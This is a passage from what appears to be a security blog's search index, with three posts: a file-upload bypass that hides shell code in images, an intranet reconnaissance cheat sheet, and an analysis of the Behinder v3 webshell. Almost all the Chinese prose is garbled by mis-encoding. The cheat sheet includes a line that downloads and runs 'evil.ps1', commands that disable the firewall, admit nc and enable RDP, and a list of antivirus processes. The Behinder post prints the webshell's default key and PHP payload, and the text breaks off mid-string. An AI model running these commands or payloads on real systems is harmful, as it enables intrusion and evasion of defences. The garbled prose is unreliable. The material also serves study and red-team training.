çš„å›¾ç‰‡è¿›è¡Œé‡æ–°æ¸²æŸ“ä»£ç  ç¨‹åºé€šè¿‡ imagecreatefromjpeg()å‡½æ•°è°ƒç”¨äº† PHP GD åº“ï¼ˆGD åº“ï¼Œæ˜¯ php å¤„ç†å›¾å½¢çš„æ‰©å±•åº“ï¼‰ï¼Œå¯¹å›¾ç‰‡è¿›è¡Œäº†è½¬æ¢ æŒ–æ´å§¿åŠ¿ï¼šç‰¹æ®Šçš„ä¸Šä¼ æŠ€å·§ï¼Œç»•è¿‡ PHP å›¾ç‰‡è½¬æ¢å®ç°è¿œç¨‹ä»£ç æ‰§è¡Œï¼ˆRCEï¼‰ upload-labs ä¹‹ pass 16 è¯¦ç»†åˆ†æ 123456789101112131415161718192021222324252627282930313233å…³é”®ä»£ç //æˆªå–ç›¸å…³åç¼€åæ“ä½œif(($fileext == &quot;jpg&quot;) &amp;&amp; ($filetype==&quot;image/jpeg&quot;)){ if(move_uploaded_file($tmpname,$target_path)){ //ä½¿ç”¨ä¸Šä¼ çš„å›¾ç‰‡ç”Ÿæˆæ–°çš„å›¾ç‰‡ $im = imagecreatefromjpeg($target_path); if($im == false){ $msg = &quot;è¯¥æ–‡ä»¶ä¸æ˜¯jpgæ ¼å¼çš„å›¾ç‰‡ï¼&quot;; @unlink($target_path); }else{ //ç»™æ–°å›¾ç‰‡æŒ‡å®šæ–‡ä»¶å srand(time()); $newfilename = strval(rand()).&quot;.jpg&quot;; //æ˜¾ç¤ºäºŒæ¬¡æ¸²æŸ“åçš„å›¾ç‰‡ï¼ˆä½¿ç”¨ç”¨æˆ·ä¸Šä¼ å›¾ç‰‡ç”Ÿæˆçš„æ–°å›¾ç‰‡ï¼‰ $img_path = UPLOAD_PATH.'/'.$newfilename; imagejpeg($im,$img_path); @unlink($target_path); $is_upload = true; } } else { $msg = &quot;ä¸Šä¼ å‡ºé”™ï¼&quot;; }else if(($fileext == &quot;png&quot;) &amp;&amp; ($filetype==&quot;image/png&quot;)){ //çœç•¥äº†ä¸€å †ä»£ç  $im = imagecreatefromjpeg($target_path);}else if(($fileext == &quot;gif&quot;) &amp;&amp; ($filetype==&quot;image/gif&quot;)){ //çœç•¥äº†ä¸€å †ä»£ç  $im = imagecreatefromjpeg($target_path);} Bypass GIF å…ˆä¸Šä¼  GIFï¼Œç„¶åå°†ä¸Šä¼ çš„å›¾ç‰‡ä¸‹è½½ä¸‹æ¥ç”¨å¯ä»¥çœ‹ 16 è¿›åˆ¶çš„ç¼–è¾‘å™¨è¿›è¡Œå¯¹æ¯”ï¼Œåœ¨æœªå˜åŒ–çš„éƒ¨åˆ†åŠ å…¥ shell ä»£ç  PNG å‚è€ƒä¸Šé¢çš„æ–‡ç«  JPG ä½¿ç”¨ [[JPG_Payload.php]] è¿™ä¸ªè„šæœ¬ï¼Œæ³¨æ„æ­¤è„šæœ¬æœ€å¥½å»ä¼ æ¯”è¾ƒå°ä¸€äº›çš„æ–‡ä»¶ï¼Œå¤ªå¤§äº†ä¼šå°† shell æ’å…¥é”™åœ°æ–¹å¯¼è‡´å¤±è´¥ï¼Œè€Œä¸”å¤šè¯•å‡ å¼ å›¾ç‰‡","link":"/2020/01/11/%E4%BB%8EPHP%E4%BB%A3%E7%A0%81%E5%B1%82%E9%9D%A2%E5%88%86%E6%9E%90%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"title":"ç®€æ˜“å†…ç½‘ä¿¡æ¯æ”¶é›†","text":"å†…ç½‘ä¿¡æ¯æ”¶é›†è¾…åŠ©å‘½ä»¤1234567891011121314151617181920// éšè—çª—å£-W Hidden-WindowStyle Hidden//éäº¤äº’æ¨¡å¼ï¼Œä¸ä¸ºç”¨æˆ·æä¾›äº¤äº’æç¤º-NonI-NonInteractive//ä½¿ç”¨IEXï¼ˆInvoke-Expressionï¼‰è¿›è¡Œè¿œç¨‹è„šæœ¬ä¸‹è½½-IEX(New-ObjectNet.WebClient).DownloadString(&quot;127.0.0.1/evil.ps1&quot;) //ä¸åŠ è½½å½“å‰ç”¨æˆ·çš„é…ç½®æ–‡ä»¶-NoP-NoProfile//æ˜¾ç¤ºlogoçš„å¯åŠ¨-NoLogo//æ‰§è¡Œåä¸é€€å‡ºshellï¼Œå¸¸ç”¨äºé”®ç›˜è®°å½•ç­‰-noexit å®—æ—¨è¿›å…¥å†…ç½‘çš„â€œé»‘æš—æ£®æ—â€åï¼Œéœ€è¦æœ‰ä¸ªå¤§è‡´çš„åˆ¤æ–­ï¼š æˆ‘æ˜¯è°ï¼ˆwhoami ç­‰ï¼‰ è¿™ä¸ªæœºå­éƒ½æœ‰è°ï¼Œæœ‰[[åŸŸ]]å—ï¼ŒåŸŸçš„è´¦æˆ·éƒ½æœ‰å•¥ï¼ˆé‡ç‚¹å…³æ³¨ 3 æœ¬åœ°ç»„ç®¡ç†å‘˜ä¸å…¨å±€ç»„ç®¡ç†å‘˜ï¼‰ï¼ŒåŸŸæ§çš„ ip åŸŸæœºå™¨åæ˜¯å•¥ æœ¬æœºä¿¡æ¯æ”¶é›† æˆ‘çš„åŸŸæœ‰å…¶ä»–å­˜æ´»çš„æœºå­å—ï¼Œéƒ½å¼€æ”¾äº†ä»€ä¹ˆç«¯å£ ç¡®å®šåŸŸç®¡ç†å‘˜ã€æœ¬åœ°ç®¡ç†å‘˜éƒ½æœ‰è°ï¼Œç™»å½•æœ¬å°æœºå™¨çš„éƒ½æœ‰è°ï¼ˆæœ‰æ²¡æœ‰åŸŸç®¡ç†å‘˜ï¼‰ å½“å‰åŸŸæ§ä¸‹çš„æ´»åŠ¨åŸŸéƒ½æœ‰å“ªäº› æ‚ä½™å‘½ä»¤123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657//æŸ¥çœ‹å½“å‰æƒé™whoamiwhoami /all //å¯ä»¥è·å–åŸŸSID//æŸ¥çœ‹å®Œæ•´IPä¿¡æ¯ipconfig /all//æŸ¥çœ‹ç³»ç»Ÿä¿¡æ¯systeminfosysteminfo | findstr /b /c:&quot;OS&quot;echo %PROCESSOR_ARCHITECTURE% //æˆ–è€…%PATH%å•¥çš„ï¼Œåæ­£æ˜¯ç¯å¢ƒå˜é‡//æŸ¥è¯¢ç«¯å£åˆ—è¡¨netstat -ano//æŸ¥çœ‹è®¡åˆ’ä»»åŠ¡schtasks /query /fo LIST /v//ä½¿ç”¨telneté€ä¸€éªŒè¯é«˜å±ç«¯å£æ˜¯å¦å¼€å¯telnet DC 22telnet DC 1443telnet 1.2.3.4 3389//æŸ¥è¯¢è·¯ç”±è¡¨route print//æŸ¥è¯¢æ‰€æœ‰å¯ç”¨æ¥å£çš„ARPç¼“å­˜è¡¨arp -a//æŸ¥çœ‹åŸŸæ§çš„æœºå™¨ånltest /DCLIST:hacke//æŸ¥çœ‹åŸŸæ§çš„ä¸»æœºånslookup -type=SRV _ldap._tcp//æŸ¥çœ‹ä»£ç†é…ç½®æƒ…å†µreg query &quot;HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings&quot;//æŸ¥è¯¢è¿œç¨‹è¿æ¥ç«¯å£ï¼ˆ0xd3då°±æ˜¯3389ï¼‰REG QUERY &quot;HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-TCP&quot; /V PortNumber//åœ¨Windows Server 2003ä¸­å¼€å¯3389wmic path win32_terminalservicesetting where (__CLASS !=&quot;&quot;) call setallowsconnections 1//åœ¨Windows Server 2008å’ŒWindows Ser ver 2012ä¸­å¼€å¯3389ï¼ˆä»¥ä¸‹ä¸‰é€‰ä¸€ï¼‰wmic /namespace:\\\\root\\cimv2\\terminalservices path win32_terminalservicesetting where (__CLASS !=&quot;&quot;) call setallowtsconnections 1wmic /namespace:\\\\root\\cimv2\\terminalservices path win32_tsgeneralsetting where (TerminalName=&quot;RDP-Tcp&quot;) call setuserauthenticationrequired 1reg add &quot;HKLM\\SYSTEM\\CURRENT\\CONTROLSET\\CONTROL\\TERMINAL SERVER&quot; /v fSingleSessionPerUser /t REG_DWORD /d 0 /f//åˆ¤æ–­å½“å‰åŸŸæ§ä¸‹æ´»åŠ¨åŸŸéƒ½æœ‰å“ªäº›//å°†åŸŸæ§æœºå™¨åæ”¾åœ¨dcs.txtä¸­ï¼ŒåŸŸç®¡ç†å‘˜æ”¾åˆ°admins.txtä¸­FOR /F %I in (dcs.txt) do @echo [+] Querying DC %I &amp;&amp; @netsess -h %I 2&gt;nul &gt;sessions.txt &amp;&amp; FOR /F %a in (admins.txt) DO @type sessions.txt | findstr /I %a//é€šè¿‡pingçš„ICMPåè®®è¿›è¡Œä¸»æœºæ¢æµ‹for /L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.1.%I | findstr &quot;TTL=&quot; net å‘½ä»¤1234567891011121314151617181920212223242526272829303132333435363738394041424344//æŸ¥çœ‹åŸŸé‡Œçš„å„ç§åŸºæœ¬ä¿¡æ¯//åŠ domainå°±æ˜¯åŸŸå†…æ“ä½œï¼Œä¼šç›´æ¥å°†å‘½ä»¤æ”¾åˆ°åŸŸæ§ä¸Šæ‰§è¡Œnet group /domainnet user /domainnet group &quot;domain admins&quot; /domain //å¯ä»¥åœ¨åé¢åŠ èº«ä»½æ¥å…·ä½“æŸ¥è¯¢net localgroup //æœ¬åœ°ç»„ //åœ¨åŸŸå†…æœºå™¨ä¸Šnet group /domain ç­‰åŒäºåœ¨åŸŸæ§ä¸Š net group//å¦‚æœåœ¨æœ¬åœ°ç»„é‡Œæ˜¯administratorsé‡Œè¾¹çš„ï¼ŒåŠæ˜¯æœ¬åœ°çš„ç³»ç»Ÿç®¡ç†å‘˜//å¦‚æœå…¨å±€ç»„ä¸­æ˜¯domain users æ—¢æ˜¯æ™®é€šåŸŸç”¨æˆ·ï¼Œå¦‚æœåœ¨å…¨å±€ç»„ä¸­çš„domain admins ç»„é‡Œè¾¹ï¼Œé‚£ä¹ˆä¸å…‰æ˜¯åŸŸç®¡ç†å‘˜è¿˜æ˜¯åŸŸå†…æ‰€æœ‰æœºå™¨çš„ç®¡ç†å‘˜ï¼ˆå³ä¼šè‡ªåŠ¨åŠ å…¥åˆ°åŸŸå†…æœºå™¨çš„ administrtors ç»„é‡Œè¾¹ï¼‰èº«ä»½å¦‚ä¸‹ï¼šDomain Admins //åŸŸç®¡ç†å‘˜ï¼ˆå®Œå…¨æ§åˆ¶æƒé™ï¼‰Domain Computers //åŸŸå†…æœºå™¨Domain Controllers //åŸŸæ§åˆ¶å™¨Domain Guest //åŸŸè®¿å®¢ï¼Œæƒé™è¾ƒä½Domain Users //åŸŸç”¨æˆ·Enterprise Admins //ä¼ä¸šç³»ç»Ÿç®¡ç†å‘˜ç”¨æˆ·ï¼ˆå®Œå…¨æ§åˆ¶æƒé™ï¼‰//æŸ¥çœ‹å½“å‰è®¡ç®—æœºä¿¡æ¯ä»¥åŠæ˜¯å¦åœ¨åŸŸä¸‹é¢net config workstation//æŸ¥çœ‹åŸŸæ§æœåŠ¡å™¨net time /domain//æŸ¥çœ‹åŸŸå¯†ç ç­–ç•¥ä¿¡æ¯net accounts /domain//æŸ¥è¯¢åŸŸnet view//æŸ¥è¯¢åŸŸå†…æ‰€æœ‰è®¡ç®—æœº//devæœ‰å¯èƒ½æ˜¯å¼€å‘æœåŠ¡å™¨ï¼Œwebã€appæœ‰å¯èƒ½æ˜¯WebæœåŠ¡å™¨ï¼ŒNASå¯èƒ½æ˜¯å­˜å‚¨æœåŠ¡å™¨ï¼Œfileserverå¯èƒ½æ˜¯æ–‡ä»¶æœåŠ¡å™¨net view /domain:HACKE//æŸ¥çœ‹ä¸»æœºå¼€æœºæ—¶é—´net statistics workstation//åˆ—å‡ºæˆ–æ–­å¼€æœ¬åœ°è®¡ç®—æœºä¸æ‰€è¿æ¥å®¢æˆ·ç«¯çš„å¯¹è¯net session//æŸ¥è¯¢æœ¬æœºå…±äº«åˆ—è¡¨net share netsh-é˜²ç«å¢™ç›¸å…³123456789101112131415161718192021//å…³é—­é˜²ç«å¢™netsh firewall set opmode disable //Windows Server 2003ä¹‹å‰ç‰ˆæœ¬netsh advfirewall set allprofiles state off //Windows Server 2003ä¹‹åç‰ˆæœ¬//æŸ¥çœ‹é˜²ç«å¢™é…ç½®netsh firewall show config//å…è®¸æŒ‡å®šç¨‹åºè¿›å…¥ï¼ˆWindows Server 2003ä¹‹å‰ç‰ˆæœ¬ï¼‰netsh firewall add allowedprogram c:\\nc.exe &quot;allow nc&quot; enable //å…è®¸æŒ‡å®šç¨‹åºè¿›å…¥netsh advfirewall firewall add rule name=&quot;pass nc&quot; dir=in action=allow //å…è®¸æŒ‡å®šç¨‹åºé€€å‡ºnetsh advfirewall firewall add rule name=&quot;Allow nc&quot; dir=out action=allow//å…è®¸æŸç«¯å£æ”¾è¡Œnetsh advfirewall firewall add rule name=&quot;Remote Desktop&quot; protocol=TCP dir=in localport=3389 action=allow//è‡ªå®šä¹‰é˜²ç«å¢™æ—¥å¿—çš„å­˜å‚¨ä½ç½®netsh advfirewall set currentprofile logging filename &quot;C:\\windows\\&quot; wmic å‚è€ƒï¼š Windows WMIC å‘½ä»¤ä½¿ç”¨è¯¦è§£(é™„å®ä¾‹) é›†åˆå‘½ä»¤é›†å‚è€ƒ wmic_info 1234567891011121314151617//è·å–å®‰è£…çš„è½¯ä»¶ã€ç‰ˆæœ¬ä¿¡æ¯wmic product get name,version//æŸ¥è¯¢æœ¬æœºçš„æœåŠ¡ä¿¡æ¯wmic service list brief//æŸ¥çœ‹å¯åŠ¨ç¨‹åºçš„ä¿¡æ¯wmic startup get command,caption//æŸ¥çœ‹å®‰è£…åœ¨ç³»ç»Ÿä¸­çš„è¡¥ä¸wmic qfe get Caption,Description,HotFixID,InstalledOn//æŸ¥è¯¢æœ¬æœºå…±äº«åˆ—è¡¨wmic share get name,path,status//æŸ¥çœ‹åŸŸå†…ç”¨æˆ·è¯¦ç»†ä¿¡æ¯wmic useraccount get /all ds å‘½ä»¤ds å‘½ä»¤åªèƒ½åœ¨ windows æœåŠ¡å™¨ç‰ˆæœ¬ä¸‹æ‰èƒ½è¿è¡Œ 12//æŸ¥çœ‹å­˜åœ¨çš„ç”¨æˆ·dsquery user tasklist å¸¸è§æ€æ¯’è½¯ä»¶è¿›ç¨‹åç§° è¿›ç¨‹å è½¯ä»¶å 360sd.exe 360 æ€æ¯’ 360tray.exe 360 å®æ—¶é˜²æŠ¤ ZhuDongFangYu.exe 360 ä¸»åŠ¨é˜²å¾¡ KSafeTray.exe é‡‘å±±å«å£« SafeDogUpdateCenter.exe æœåŠ¡å™¨å®‰å…¨ç‹— McAfee McShield.exe McAfee egui.exe NOD32 AVP.EXE å¡å·´æ–¯åŸº avguard.exe å°çº¢ä¼ bdagent.exe BitDefender adfind.exeä½¿ç”¨ adfind.exe ä¸‹è½½é“¾æ¥ï¼š Adfind nbtscan.exeä½¿ç”¨ nbtscan.exe è¿›è¡ŒåŸŸå†…å­˜æ´»ä¸»æœºçš„æ¢æµ‹ ä¸‹è½½é“¾æ¥ï¼š nbtscan è¡Œæœ«çš„æç¤ºå¯¹ç…§è¡¨ Token å«ä¹‰ SHARING è¯¥æœºå™¨ä¸­å­˜åœ¨æ­£åœ¨è¿è¡Œçš„æ–‡ä»¶å’Œæ‰“å°å…±äº«æœåŠ¡ï¼Œä½†ä¸ä¸€å®šæœ‰å†…å®¹å…±äº« DC è¯¥æœºå™¨å¯èƒ½æ˜¯åŸŸæ§åˆ¶å™¨ U=USER è¯¥æœºå™¨ä¸­æœ‰ç™»å½•åä¸º User çš„ç”¨æˆ· IIS è¯¥æœºå™¨å¯èƒ½å®‰è£…äº† IIS æœåŠ¡å™¨ EXCHANGE è¯¥æœºå™¨å¯èƒ½å®‰è£…äº† Exchange NOTES è¯¥æœºå™¨å¯èƒ½å®‰è£…äº† Lotus Notes ç”µå­é‚®ä»¶å®¢æˆ·ç«¯ ? æ²¡æœ‰è¯†åˆ«å‡ºè¯¥æœºå™¨çš„ NetBIOS èµ„æºï¼ˆå¯ä»¥ä½¿ç”¨-F é€‰é¡¹å†æ¬¡æ‰«æï¼‰ [[Metasploit]]ä½¿ç”¨ TCP æ¨¡å—è¿›è¡Œç«¯å£æ‰«æ1234567search portscanuse auxiliary/scanner/portscan/tcp //æˆ–è€…ä½¿ç”¨å…¶ä»–ç«¯å£æ‰«æè½¯ä»¶set RHOSTS 1.2.3.4set ports 1-4000set THREADS 10run [[powershell]]æ¡†æ¶ nishang powersploit","link":"/2021/06/11/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"},{"title":"å†°è(BehinderV3.X) åŸç†åˆ†æ","text":"V2.1 å†°è-ç‰¹å¾æ£€æµ‹åŠæŠ¥æ–‡è§£å¯† å†°è v2.0.1-åŠ¨æ€äºŒè¿›åˆ¶åŠ å¯†ç½‘ç«™ç®¡ç†å®¢æˆ·ç«¯æºç åˆ†æ çº¢è“å¯¹æŠ—â€”â€”åŠ å¯† Webshellâ€œå†°èâ€ æµé‡ 100% è¯†åˆ« V3.0 åŸç†è§£é‡Šï¼š å†°è Behinder 3.X ï¼ˆè¿™ä¸ªåŸç†é’ˆå¯¹Beta1ï¼Œæœ€æ–°æ‚¨Beta6åœ¨contentéƒ¨åˆ†åŠ äº†æ··æ·†ï¼‰ å†°èçš„å‰ä¸–ä»Šç”Ÿï¼š3.0 æ–°ç‰ˆæœ¬ä¸‹çš„ä¸€äº›é˜²æŠ¤æ€è€ƒ å®‰å…¨å®éªŒå®¤ | å†°è 3.0 ç»•è¿‡ HIDS åŸç†åˆ†æ å†°è 3.0-åˆ†æç³»åˆ— 3-jsp-beta4,5 å†°è 3.0 æµé‡åˆ†æä¸è¿˜åŸ Behinder3 åŸç† æ‰¿æ¥å†°è 2ï¼Œå†°è 2 çš„æ¯æ¬¡è¿æ¥ä¼šä½¿ç”¨ä¸€ä¸ªéšæœºä»¤ç‰Œ passï¼ˆå³é€šè¿‡ Shell äº¤äº’è¿‡ç¨‹ä¸­çš„ HTTP è¯·æ±‚ç‰¹å¾å¯ä½œä¸ºç‰¹å¾æ‹¦æˆªï¼‰ï¼›æµç¨‹ä¸ºï¼šå¯†é’¥åå•†-&gt;åŠ å¯†ä¼ è¾“ï¼Œè€Œå¯†é’¥åå•†è¿™å—ä¼šè¢«ä½œä¸ºç‰¹å¾è€Œè¢«æ‹¦æˆªï¼›é€šè¿‡ Webshell ä¸Šä¼ æ—¶çš„æµé‡ç‰¹å¾æ¥æ£€æµ‹ï¼›é€šè¿‡åˆ©ç”¨ rasp æœºåˆ¶æ¥æ£€æµ‹ï¼Œå…·ä½“åŸç†æ–‡ç« è¯¦è§ å†°è-ç‰¹å¾æ£€æµ‹åŠæŠ¥æ–‡è§£å¯† è€Œå†°è 3 å–æ¶ˆäº†éšæœºä»¤ç‰Œï¼Œå›ºå®šäº†ä»¤ç‰Œåœ¨ shell.php\\asp\\jsp ç­‰é‡Œè¾¹ï¼Œå…¶ä»£ç æ˜¯ï¼š 12345 //è¯¥å¯†é’¥ä¸ºè¿æ¥å¯†ç 32ä½md5å€¼çš„å‰16ä½ï¼Œé»˜è®¤è¿æ¥å¯†ç rebeyond$key=&quot;e45e329feb5d925b&quot;;//æœºç†md5(&quot;admin&quot;)\\[0:16\\]ï¼› å†°è 3 ä½¿ç”¨äº† AES å¯¹ç§°åŠ å¯†ä¸ Base64 çš„ç»“åˆï¼Œæµé‡ä¸­çš„æ•°æ®éœ€è¦ä½¿ç”¨å¯†ç ä¸º e45e329feb5d925bï¼ˆrebeyond çš„ md5 å‰ 16 ä½ï¼‰ï¼Œåç§»é‡ä¸º 0123456789abcdefï¼ŒAES åŠ å¯†æ¨¡å¼ä¸€å®šä¸º CBC AES è§£å¯† base64 è§£å¯† é€šè¿‡ wireshark æŠ“åŒ…ï¼Œå†°èä¼šå‘é€ä¸¤æ¬¡ POST åŒ…ï¼Œæ¥æ”¶åˆ°ä¸¤æ¬¡åŒ…ï¼Œå³ä¸¤æ¬¡å®¢æˆ·ç«¯-æœåŠ¡ç«¯äº¤äº’ ç¬¬ä¸€æ¬¡äº¤äº’ å®¢æˆ·ç«¯å‘é€ å†°èé¦–å…ˆå‘é€ä¸€ä¸ªé€šè¿‡AES è§£å¯†ï¼Œå†é€šè¿‡ Base64 è§£å¯†ä¸ºå¦‚ä¸‹å†…å®¹çš„åŒ…ï¼ˆè§£å¯†æµç¨‹çœ‹ å†°è Behinder 3.X ï¼‰ï¼Œæ¥å»ºç«‹è¿æ¥åŒæ—¶å‘é€contentå†…å®¹ä½œä¸ºè¿æ¥æˆåŠŸçš„é…å¯¹ï¼Œå¦‚æœå¯¹æ–¹æœåŠ¡å™¨è¿”å›äº†contentçš„å†…å®¹ï¼Œè¯æ˜è¿æ¥æˆåŠŸ 1234567891011121314151617181920212223242526//è¿™æ®µæ•°æ®åŒ…åœ¨å®é™…æµé‡ä¸­åº”è¯¥æ˜¯Base64å†AESåçš„å¯†æ–‡@error_reporting(0);function main($content){ $result = array(); $result[&quot;status&quot;] = base64_encode(&quot;success&quot;); $result[&quot;msg&quot;] = base64_encode($content); $key = $_SESSION['k']; echo encrypt(json_encode($result),$key);}function encrypt($data,$key){ if(!extension_loaded('openssl')) { for($i=0;$i&lt;strlen($data);$i++) { $data[$i] = $data[$i]^$key[$i+1&amp;15]; } return $data; } else { return openssl_encrypt($data, &quot;AES128&quot;, $key); }//ä¸‹é¢è¿™æ®µcontentåœ¨BehinderV3.0 Beta1ä¸­æ˜¯å¾ˆçŸ­ä¸€æ®µå­—ç¬¦ä¸²ï¼Œè€ŒBeta6åšäº†æ··æ·†}$content=&quot;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&quot;; main($content); æœåŠ¡ç«¯ç›¸åº” 1 12//å³å“åº”å®¢æˆ·ç«¯å‘é€çš„contentï¼Œå¦‚æœè¿”å›äº†è¿™ä¸ªåˆ™è¯´æ˜è¿æ¥æˆåŠŸäº†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